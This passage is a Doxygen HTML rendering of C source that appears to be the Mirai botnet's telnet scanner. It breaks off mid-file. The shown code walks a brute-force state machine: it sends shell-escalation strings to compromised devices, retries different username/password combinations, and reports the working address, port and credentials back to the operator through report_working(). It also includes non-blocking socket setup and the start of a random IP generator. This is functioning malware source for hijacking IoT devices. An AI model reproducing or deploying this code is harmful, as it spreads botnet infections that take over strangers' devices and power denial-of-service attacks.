href="table_8h.html#a577985acedbf4e923d0fb33980a3ed0d">TABLE_SCAN_ENABLE</a>, &amp;tmp_len);</div><div class="line"><a name="l00498"></a><span class="lineno">  498</span>&#160;                                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, tmp_str, tmp_len, MSG_NOSIGNAL);</div><div class="line"><a name="l00499"></a><span class="lineno">  499</span>&#160;                                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, <span class="stringliteral">&quot;\r\n&quot;</span>, 2, MSG_NOSIGNAL);</div><div class="line"><a name="l00500"></a><span class="lineno">  500</span>&#160;                                <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#a577985acedbf4e923d0fb33980a3ed0d">TABLE_SCAN_ENABLE</a>);</div><div class="line"><a name="l00501"></a><span class="lineno">  501</span>&#160;                                conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfac06962b31cf1edfe8def6e3c524903c4">SC_WAITING_ENABLE_RESP</a>;</div><div class="line"><a name="l00502"></a><span class="lineno">  502</span>&#160;                            }</div><div class="line"><a name="l00503"></a><span class="lineno">  503</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00504"></a><span class="lineno">  504</span>&#160;                        <span class="keywordflow">case</span> <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfac06962b31cf1edfe8def6e3c524903c4">SC_WAITING_ENABLE_RESP</a>:</div><div class="line"><a name="l00505"></a><span class="lineno">  505</span>&#160;                            <span class="keywordflow">if</span> ((consumed = <a class="code" href="scanner_8h.html#a51caaf2e58a39d0e9a78aa3a633bde5e">consume_any_prompt</a>(conn)) &gt; 0)</div><div class="line"><a name="l00506"></a><span class="lineno">  506</span>&#160;                            {</div><div class="line"><a name="l00507"></a><span class="lineno">  507</span>&#160;                                <span class="keywordtype">char</span> *tmp_str;</div><div class="line"><a name="l00508"></a><span class="lineno">  508</span>&#160;                                <span class="keywordtype">int</span> tmp_len;</div><div class="line"><a name="l00509"></a><span class="lineno">  509</span>&#160;</div><div class="line"><a name="l00510"></a><span class="lineno">  510</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00511"></a><span class="lineno">  511</span>&#160;                                printf(<span class="stringliteral">&quot;[scanner] FD%d received sh prompt\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00512"></a><span class="lineno">  512</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00513"></a><span class="lineno">  513</span>&#160;</div><div class="line"><a name="l00514"></a><span class="lineno">  514</span>&#160;                                <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a778dd0ebf9da419861e8352b5c13046c">TABLE_SCAN_SYSTEM</a>);</div><div class="line"><a name="l00515"></a><span class="lineno">  515</span>&#160;                                tmp_str = <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a778dd0ebf9da419861e8352b5c13046c">TABLE_SCAN_SYSTEM</a>, &amp;tmp_len);</div><div class="line"><a name="l00516"></a><span class="lineno">  516</span>&#160;                                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, tmp_str, tmp_len, MSG_NOSIGNAL);</div><div class="line"><a name="l00517"></a><span class="lineno">  517</span>&#160;                                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, <span class="stringliteral">&quot;\r\n&quot;</span>, 2, MSG_NOSIGNAL);</div><div class="line"><a name="l00518"></a><span class="lineno">  518</span>&#160;                                <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#a778dd0ebf9da419861e8352b5c13046c">TABLE_SCAN_SYSTEM</a>);</div><div class="line"><a name="l00519"></a><span class="lineno">  519</span>&#160;</div><div class="line"><a name="l00520"></a><span class="lineno">  520</span>&#160;                                conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa2cc6e096ce420b903ad8a9704b3f8a3b">SC_WAITING_SYSTEM_RESP</a>;</div><div class="line"><a name="l00521"></a><span class="lineno">  521</span>&#160;                            }</div><div class="line"><a name="l00522"></a><span class="lineno">  522</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00523"></a><span class="lineno">  523</span>&#160;            <span class="keywordflow">case</span> <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa2cc6e096ce420b903ad8a9704b3f8a3b">SC_WAITING_SYSTEM_RESP</a>:</div><div class="line"><a name="l00524"></a><span class="lineno">  524</span>&#160;                            <span class="keywordflow">if</span> ((consumed = <a class="code" href="scanner_8h.html#a51caaf2e58a39d0e9a78aa3a633bde5e">consume_any_prompt</a>(conn)) &gt; 0)</div><div class="line"><a name="l00525"></a><span class="lineno">  525</span>&#160;                            {</div><div class="line"><a name="l00526"></a><span class="lineno">  526</span>&#160;                                <span class="keywordtype">char</span> *tmp_str;</div><div class="line"><a name="l00527"></a><span class="lineno">  527</span>&#160;                                <span class="keywordtype">int</span> tmp_len;</div><div class="line"><a name="l00528"></a><span class="lineno">  528</span>&#160;</div><div class="line"><a name="l00529"></a><span class="lineno">  529</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00530"></a><span class="lineno">  530</span>&#160;                                printf(<span class="stringliteral">&quot;[scanner] FD%d received sh prompt\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00531"></a><span class="lineno">  531</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00532"></a><span class="lineno">  532</span>&#160;</div><div class="line"><a name="l00533"></a><span class="lineno">  533</span>&#160;                                <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a1ef90a6398b8126ff3a500acd6d6b566">TABLE_SCAN_SHELL</a>);</div><div class="line"><a name="l00534"></a><span class="lineno">  534</span>&#160;                                tmp_str = <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a1ef90a6398b8126ff3a500acd6d6b566">TABLE_SCAN_SHELL</a>, &amp;tmp_len);</div><div class="line"><a name="l00535"></a><span class="lineno">  535</span>&#160;                                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, tmp_str, tmp_len, MSG_NOSIGNAL);</div><div class="line"><a name="l00536"></a><span class="lineno">  536</span>&#160;                                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, <span class="stringliteral">&quot;\r\n&quot;</span>, 2, MSG_NOSIGNAL);</div><div class="line"><a name="l00537"></a><span class="lineno">  537</span>&#160;                                <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#a1ef90a6398b8126ff3a500acd6d6b566">TABLE_SCAN_SHELL</a>);</div><div class="line"><a name="l00538"></a><span class="lineno">  538</span>&#160;</div><div class="line"><a name="l00539"></a><span class="lineno">  539</span>&#160;                                conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfabd9c83717f558e3753f01bfb62dac260">SC_WAITING_SHELL_RESP</a>;</div><div class="line"><a name="l00540"></a><span class="lineno">  540</span>&#160;                            }</div><div class="line"><a name="l00541"></a><span class="lineno">  541</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00542"></a><span class="lineno">  542</span>&#160;                        <span class="keywordflow">case</span> <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfabd9c83717f558e3753f01bfb62dac260">SC_WAITING_SHELL_RESP</a>:</div><div class="line"><a name="l00543"></a><span class="lineno">  543</span>&#160;                            <span class="keywordflow">if</span> ((consumed = <a class="code" href="scanner_8h.html#a51caaf2e58a39d0e9a78aa3a633bde5e">consume_any_prompt</a>(conn)) &gt; 0)</div><div class="line"><a name="l00544"></a><span class="lineno">  544</span>&#160;                            {</div><div class="line"><a name="l00545"></a><span class="lineno">  545</span>&#160;                                <span class="keywordtype">char</span> *tmp_str;</div><div class="line"><a name="l00546"></a><span class="lineno">  546</span>&#160;                                <span class="keywordtype">int</span> tmp_len;</div><div class="line"><a name="l00547"></a><span class="lineno">  547</span>&#160;</div><div class="line"><a name="l00548"></a><span class="lineno">  548</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00549"></a><span class="lineno">  549</span>&#160;                                printf(<span class="stringliteral">&quot;[scanner] FD%d received enable prompt\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00550"></a><span class="lineno">  550</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00551"></a><span class="lineno">  551</span>&#160;</div><div class="line"><a name="l00552"></a><span class="lineno">  552</span>&#160;                                <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a580e3d9937b4ebf6cf286fd2cd0820a7">TABLE_SCAN_SH</a>);</div><div class="line"><a name="l00553"></a><span class="lineno">  553</span>&#160;                                tmp_str = <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a580e3d9937b4ebf6cf286fd2cd0820a7">TABLE_SCAN_SH</a>, &amp;tmp_len);</div><div class="line"><a name="l00554"></a><span class="lineno">  554</span>&#160;                                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, tmp_str, tmp_len, MSG_NOSIGNAL);</div><div class="line"><a name="l00555"></a><span class="lineno">  555</span>&#160;                                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, <span class="stringliteral">&quot;\r\n&quot;</span>, 2, MSG_NOSIGNAL);</div><div class="line"><a name="l00556"></a><span class="lineno">  556</span>&#160;                                <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#a580e3d9937b4ebf6cf286fd2cd0820a7">TABLE_SCAN_SH</a>);</div><div class="line"><a name="l00557"></a><span class="lineno">  557</span>&#160;</div><div class="line"><a name="l00558"></a><span class="lineno">  558</span>&#160;                                conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfac7c328e0bf6ed4b6e5b3db001d8edb4f">SC_WAITING_SH_RESP</a>;</div><div class="line"><a name="l00559"></a><span class="lineno">  559</span>&#160;                            }</div><div class="line"><a name="l00560"></a><span class="lineno">  560</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00561"></a><span class="lineno">  561</span>&#160;                        <span class="keywordflow">case</span> <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfac7c328e0bf6ed4b6e5b3db001d8edb4f">SC_WAITING_SH_RESP</a>:</div><div class="line"><a name="l00562"></a><span class="lineno">  562</span>&#160;                            <span class="keywordflow">if</span> ((consumed = <a class="code" href="scanner_8h.html#a51caaf2e58a39d0e9a78aa3a633bde5e">consume_any_prompt</a>(conn)) &gt; 0)</div><div class="line"><a name="l00563"></a><span class="lineno">  563</span>&#160;                            {</div><div class="line"><a name="l00564"></a><span class="lineno">  564</span>&#160;                                <span class="keywordtype">char</span> *tmp_str;</div><div class="line"><a name="l00565"></a><span class="lineno">  565</span>&#160;                                <span class="keywordtype">int</span> tmp_len;</div><div class="line"><a name="l00566"></a><span class="lineno">  566</span>&#160;</div><div class="line"><a name="l00567"></a><span class="lineno">  567</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00568"></a><span class="lineno">  568</span>&#160;                                printf(<span class="stringliteral">&quot;[scanner] FD%d received sh prompt\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00569"></a><span class="lineno">  569</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00570"></a><span class="lineno">  570</span>&#160;</div><div class="line"><a name="l00571"></a><span class="lineno">  571</span>&#160;                                <span class="comment">// Send query string</span></div><div class="line"><a name="l00572"></a><span class="lineno">  572</span>&#160;                                <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a573abc111267f05189a98e4745fc8e60">TABLE_SCAN_QUERY</a>);</div><div class="line"><a name="l00573"></a><span class="lineno">  573</span>&#160;                                tmp_str = <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a573abc111267f05189a98e4745fc8e60">TABLE_SCAN_QUERY</a>, &amp;tmp_len);</div><div class="line"><a name="l00574"></a><span class="lineno">  574</span>&#160;                                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, tmp_str, tmp_len, MSG_NOSIGNAL);</div><div class="line"><a name="l00575"></a><span class="lineno">  575</span>&#160;                                send(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, <span class="stringliteral">&quot;\r\n&quot;</span>, 2, MSG_NOSIGNAL);</div><div class="line"><a name="l00576"></a><span class="lineno">  576</span>&#160;                                <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#a573abc111267f05189a98e4745fc8e60">TABLE_SCAN_QUERY</a>);</div><div class="line"><a name="l00577"></a><span class="lineno">  577</span>&#160;</div><div class="line"><a name="l00578"></a><span class="lineno">  578</span>&#160;                                conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa45d35ca60e95088a30afde0284b0b404">SC_WAITING_TOKEN_RESP</a>;</div><div class="line"><a name="l00579"></a><span class="lineno">  579</span>&#160;                            }</div><div class="line"><a name="l00580"></a><span class="lineno">  580</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00581"></a><span class="lineno">  581</span>&#160;                        <span class="keywordflow">case</span> <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfa45d35ca60e95088a30afde0284b0b404">SC_WAITING_TOKEN_RESP</a>:</div><div class="line"><a name="l00582"></a><span class="lineno">  582</span>&#160;                            consumed = <a class="code" href="scanner_8h.html#ab511b60a1641bbf457b488b35887a583">consume_resp_prompt</a>(conn);</div><div class="line"><a name="l00583"></a><span class="lineno">  583</span>&#160;                            <span class="keywordflow">if</span> (consumed == -1)</div><div class="line"><a name="l00584"></a><span class="lineno">  584</span>&#160;                            {</div><div class="line"><a name="l00585"></a><span class="lineno">  585</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00586"></a><span class="lineno">  586</span>&#160;                                printf(<span class="stringliteral">&quot;[scanner] FD%d invalid username/password combo\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00587"></a><span class="lineno">  587</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00588"></a><span class="lineno">  588</span>&#160;                                <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00589"></a><span class="lineno">  589</span>&#160;                                conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a> = -1;</div><div class="line"><a name="l00590"></a><span class="lineno">  590</span>&#160;</div><div class="line"><a name="l00591"></a><span class="lineno">  591</span>&#160;                                <span class="comment">// Retry</span></div><div class="line"><a name="l00592"></a><span class="lineno">  592</span>&#160;                                <span class="keywordflow">if</span> (++(conn-&gt;<a class="code" href="structscanner__connection.html#a6d48d3c152bef1b9c072ab3fdffcb285">tries</a>) == 10)</div><div class="line"><a name="l00593"></a><span class="lineno">  593</span>&#160;                                {</div><div class="line"><a name="l00594"></a><span class="lineno">  594</span>&#160;                                    conn-&gt;<a class="code" href="structscanner__connection.html#a6d48d3c152bef1b9c072ab3fdffcb285">tries</a> = 0;</div><div class="line"><a name="l00595"></a><span class="lineno">  595</span>&#160;                                    conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfadf24afb192442661937cd364b68d76c6">SC_CLOSED</a>;</div><div class="line"><a name="l00596"></a><span class="lineno">  596</span>&#160;                                }</div><div class="line"><a name="l00597"></a><span class="lineno">  597</span>&#160;                                <span class="keywordflow">else</span></div><div class="line"><a name="l00598"></a><span class="lineno">  598</span>&#160;                                {</div><div class="line"><a name="l00599"></a><span class="lineno">  599</span>&#160;                                    <a class="code" href="scanner_8h.html#ab4d05f6f50d6ff26552bfcc373527659">setup_connection</a>(conn);</div><div class="line"><a name="l00600"></a><span class="lineno">  600</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00601"></a><span class="lineno">  601</span>&#160;                                    printf(<span class="stringliteral">&quot;[scanner] FD%d retrying with different auth combo!\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00602"></a><span class="lineno">  602</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00603"></a><span class="lineno">  603</span>&#160;                                }</div><div class="line"><a name="l00604"></a><span class="lineno">  604</span>&#160;                            }</div><div class="line"><a name="l00605"></a><span class="lineno">  605</span>&#160;                            <span class="keywordflow">else</span> <span class="keywordflow">if</span> (consumed &gt; 0)</div><div class="line"><a name="l00606"></a><span class="lineno">  606</span>&#160;                            {</div><div class="line"><a name="l00607"></a><span class="lineno">  607</span>&#160;                                <span class="keywordtype">char</span> *tmp_str;</div><div class="line"><a name="l00608"></a><span class="lineno">  608</span>&#160;                                <span class="keywordtype">int</span> tmp_len;</div><div class="line"><a name="l00609"></a><span class="lineno">  609</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00610"></a><span class="lineno">  610</span>&#160;                                printf(<span class="stringliteral">&quot;[scanner] FD%d Found verified working telnet\n&quot;</span>, conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00611"></a><span class="lineno">  611</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00612"></a><span class="lineno">  612</span>&#160;                                <a class="code" href="scanner_8h.html#afb6d13bfddcca9aa6d466bb831c600e3">report_working</a>(conn-&gt;<a class="code" href="structscanner__connection.html#aaa8150f776cb2b9c66932501a5d1c5e8">dst_addr</a>, conn-&gt;<a class="code" href="structscanner__connection.html#a3c7eb1f8350e4fe3474722cd78a77040">dst_port</a>, conn-&gt;<a class="code" href="structscanner__connection.html#a2df0a83fe9b12e23a5b4cb7177577a69">auth</a>);</div><div class="line"><a name="l00613"></a><span class="lineno">  613</span>&#160;                                <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00614"></a><span class="lineno">  614</span>&#160;                                conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a> = -1;</div><div class="line"><a name="l00615"></a><span class="lineno">  615</span>&#160;                                conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = <a class="code" href="structscanner__connection.html#ae01593a18b7b72016b609c095fec85cfadf24afb192442661937cd364b68d76c6">SC_CLOSED</a>;</div><div class="line"><a name="l00616"></a><span class="lineno">  616</span>&#160;                            }</div><div class="line"><a name="l00617"></a><span class="lineno">  617</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00618"></a><span class="lineno">  618</span>&#160;                        <span class="keywordflow">default</span>:</div><div class="line"><a name="l00619"></a><span class="lineno">  619</span>&#160;                            consumed = 0;</div><div class="line"><a name="l00620"></a><span class="lineno">  620</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00621"></a><span class="lineno">  621</span>&#160;                        }</div><div class="line"><a name="l00622"></a><span class="lineno">  622</span>&#160;</div><div class="line"><a name="l00623"></a><span class="lineno">  623</span>&#160;                        <span class="comment">// If no data was consumed, move on</span></div><div class="line"><a name="l00624"></a><span class="lineno">  624</span>&#160;                        <span class="keywordflow">if</span> (consumed == 0)</div><div class="line"><a name="l00625"></a><span class="lineno">  625</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00626"></a><span class="lineno">  626</span>&#160;                        <span class="keywordflow">else</span></div><div class="line"><a name="l00627"></a><span class="lineno">  627</span>&#160;                        {</div><div class="line"><a name="l00628"></a><span class="lineno">  628</span>&#160;                            <span class="keywordflow">if</span> (consumed &gt; conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a>)</div><div class="line"><a name="l00629"></a><span class="lineno">  629</span>&#160;                                consumed = conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a>;</div><div class="line"><a name="l00630"></a><span class="lineno">  630</span>&#160;</div><div class="line"><a name="l00631"></a><span class="lineno">  631</span>&#160;                            conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a> -= consumed;</div><div class="line"><a name="l00632"></a><span class="lineno">  632</span>&#160;                            memmove(conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>, conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a> + consumed, conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a>);</div><div class="line"><a name="l00633"></a><span class="lineno">  633</span>&#160;                        }</div><div class="line"><a name="l00634"></a><span class="lineno">  634</span>&#160;                    }</div><div class="line"><a name="l00635"></a><span class="lineno">  635</span>&#160;                }</div><div class="line"><a name="l00636"></a><span class="lineno">  636</span>&#160;            }</div><div class="line"><a name="l00637"></a><span class="lineno">  637</span>&#160;        }</div><div class="line"><a name="l00638"></a><span class="lineno">  638</span>&#160;    }</div><div class="line"><a name="l00639"></a><span class="lineno">  639</span>&#160;}</div><div class="line"><a name="l00640"></a><span class="lineno">  640</span>&#160;</div><div class="line"><a name="l00641"></a><span class="lineno">  641</span>&#160;<span class="keywordtype">void</span> <a class="code" href="scanner_8h.html#a73754b0ee96be3722127b3c7e0be8350">scanner_kill</a>(<span class="keywordtype">void</span>)</div><div class="line"><a name="l00642"></a><span class="lineno">  642</span>&#160;{</div><div class="line"><a name="l00643"></a><span class="lineno">  643</span>&#160;    kill(scanner_pid, 9);</div><div class="line"><a name="l00644"></a><span class="lineno">  644</span>&#160;}</div><div class="line"><a name="l00645"></a><span class="lineno">  645</span>&#160;</div><div class="line"><a name="l00646"></a><span class="lineno">  646</span>&#160;<span class="keyword">static</span> <span class="keywordtype">void</span> <a class="code" href="scanner_8h.html#ab4d05f6f50d6ff26552bfcc373527659">setup_connection</a>(<span class="keyword">struct</span> <a class="code" href="structscanner__connection.html">scanner_connection</a> *conn)</div><div class="line"><a name="l00647"></a><span class="lineno">  647</span>&#160;{</div><div class="line"><a name="l00648"></a><span class="lineno">  648</span>&#160;    <span class="keyword">struct </span>sockaddr_in addr = {0};</div><div class="line"><a name="l00649"></a><span class="lineno">  649</span>&#160;</div><div class="line"><a name="l00650"></a><span class="lineno">  650</span>&#160;    <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a> != -1)</div><div class="line"><a name="l00651"></a><span class="lineno">  651</span>&#160;        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>);</div><div class="line"><a name="l00652"></a><span class="lineno">  652</span>&#160;    <span class="keywordflow">if</span> ((conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a> = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_STREAM, 0)) == -1)</div><div class="line"><a name="l00653"></a><span class="lineno">  653</span>&#160;    {</div><div class="line"><a name="l00654"></a><span class="lineno">  654</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00655"></a><span class="lineno">  655</span>&#160;        printf(<span class="stringliteral">&quot;[scanner] Failed to call socket()\n&quot;</span>);</div><div class="line"><a name="l00656"></a><span class="lineno">  656</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00657"></a><span class="lineno">  657</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00658"></a><span class="lineno">  658</span>&#160;    }</div><div class="line"><a name="l00659"></a><span class="lineno">  659</span>&#160;</div><div class="line"><a name="l00660"></a><span class="lineno">  660</span>&#160;    conn-&gt;<a class="code" href="structscanner__connection.html#a926ec8e853c16b6819ddfd89df013097">rdbuf_pos</a> = 0;</div><div class="line"><a name="l00661"></a><span class="lineno">  661</span>&#160;    <a class="code" href="mirai_2bot_2util_8c.html#af2f61b2c3c38da3f06a301c596b5b47d">util_zero</a>(conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>, <span class="keyword">sizeof</span>(conn-&gt;<a class="code" href="structscanner__connection.html#ae5782b466533ce6bdb7ac486e0d4f4b1">rdbuf</a>));</div><div class="line"><a name="l00662"></a><span class="lineno">  662</span>&#160;</div><div class="line"><a name="l00663"></a><span class="lineno">  663</span>&#160;    fcntl(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, F_SETFL, O_NONBLOCK | fcntl(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, F_GETFL, 0));</div><div class="line"><a name="l00664"></a><span class="lineno">  664</span>&#160;</div><div class="line"><a name="l00665"></a><span class="lineno">  665</span>&#160;    addr.sin_family = AF_INET;</div><div class="line"><a name="l00666"></a><span class="lineno">  666</span>&#160;    addr.sin_addr.s_addr = conn-&gt;<a class="code" href="structscanner__connection.html#aaa8150f776cb2b9c66932501a5d1c5e8">dst_addr</a>;</div><div class="line"><a name="l00667"></a><span class="lineno">  667</span>&#160;    addr.sin_port = conn-&gt;<a class="code" href="structscanner__connection.html#a3c7eb1f8350e4fe3474722cd78a77040">dst_port</a>;</div><div class="line"><a name="l00668"></a><span class="lineno">  668</span>&#160;</div><div class="line"><a name="l00669"></a><span class="lineno">  669</span>&#160;    conn-&gt;<a class="code" href="structscanner__connection.html#a404ba23e26531c9e469151220f2b8c5b">last_recv</a> = fake_time;</div><div class="line"><a name="l00670"></a><span class="lineno">  670</span>&#160;    conn-&gt;<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = SC_CONNECTING;</div><div class="line"><a name="l00671"></a><span class="lineno">  671</span>&#160;    <a class="code" href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a>(conn-&gt;<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a>, (<span class="keyword">struct</span> sockaddr *)&amp;addr, sizeof (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00672"></a><span class="lineno">  672</span>&#160;}</div><div class="line"><a name="l00673"></a><span class="lineno">  673</span>&#160;</div><div class="line"><a name="l00674"></a><span class="lineno">  674</span>&#160;<span class="keyword">static</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a> <a class="code" href="scanner_8h.html#ad4ec7558569ac7b11fca77e309fe2142">get_random_ip</a>(<span class="keywordtype">void</span>)</div><div class="line"><a name="l00675"></a><span class="lineno">  675</span>&#160;{</div><div class="line"><a name="l00676"></a><span class="lineno">  